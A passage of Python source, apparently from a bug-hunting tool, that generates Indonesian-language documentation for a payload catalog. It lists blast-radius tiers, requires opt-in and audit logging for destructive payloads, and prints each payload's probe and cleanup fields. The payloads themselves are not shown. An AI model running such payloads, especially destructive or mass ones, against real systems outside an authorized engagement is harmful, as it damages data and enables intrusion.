        "Dokumen ini digenerate dari `wth_ai/hunt/payloads.py` (`wth payloads doc`), jadi",
        "isinya tidak bisa menyimpang dari payload yang benar-benar ada di kode.",
        "",
        "## Cara kerja batasnya",
        "",
        "| blast_radius | arti | boleh dijalankan otomatis |",
        "|---|---|---|",
        "| `self` | hanya objek/marker buatan kita | ya |",
        "| `single-object` | satu objek target, id dicatat untuk pemulihan | ya (bila diizinkan) |",
        "| `mass` | banyak objek/data | **tidak pernah** (`auto_runnable=False`) |",
        "",
        "Payload destruktif (`requires_destructive`) hanya jalan bila engagement membuka",
        "`destructive_allowed` (`/scope set destructive=yes`), dan setiap aksi destructif",
        "masuk audit log. Default: tertutup.",
        "",
        "## Mengapa destructive dibuat berbatas",
        "",
        "Bukan sensor: destruksi tak berbatas menghancurkan bukti yang dibutuhkan laporan,",
        "merusak lingkungan engagement, dan sering menghapus justru data yang membuktikan",
        "bug-nya. Untuk setiap payload massal ada padanan berbatas yang membuktikan kelas",
        "bug yang sama (`bounded_alternative`), dan padanan itu yang dipakai mesin.",
        "",
        "## Isi katalog",
    ]
    by_class: dict[str, list[Payload]] = {}
    for payload in PAYLOADS:
        by_class.setdefault(payload.vuln_class, []).append(payload)
    for vuln_class, items in sorted(by_class.items()):
        lines.append(f"\n### {vuln_class} ({len(items)} payload)")
        for payload in items:
            lines.append(f"\n#### `{payload.id}` — {payload.title}")
            lines.append(f"- **membuktikan**: {payload.proves}")
            lines.append(f"- **blast radius**: `{payload.blast_radius}` · "
                         f"**reversibel**: {'ya' if payload.reversible else 'tidak'} · "
                         f"**butuh opt-in destruktif**: {'ya' if payload.requires_destructive else 'tidak'}")
            lines.append(f"- **probe**: `{payload.probe.get('method', 'GET')} "
                         f"{payload.probe.get('url', '')}`")
            if payload.cleanup:
                lines.append(f"- **pemulihan**: {payload.cleanup}")
            if payload.notes:
                lines.append(f"- **catatan**: {payload.notes}")
            if payload.bounded_alternative:
                lines.append(f"- **padanan berbatas**: {payload.bounded_alternative}")
    lines.append("")
    lines.append(f"Total: **{len(PAYLOADS)} payload** di "
                 f"**{len(by_class)} kelas** "
                 f"({sum(1 for p in PAYLOADS if p.blast_radius == 'mass')} ditandai massal, "
                 f"{sum(1 for p in PAYLOADS if p.requires_destructive)} butuh opt-in destruktif).")
    return "\n".join(lines)
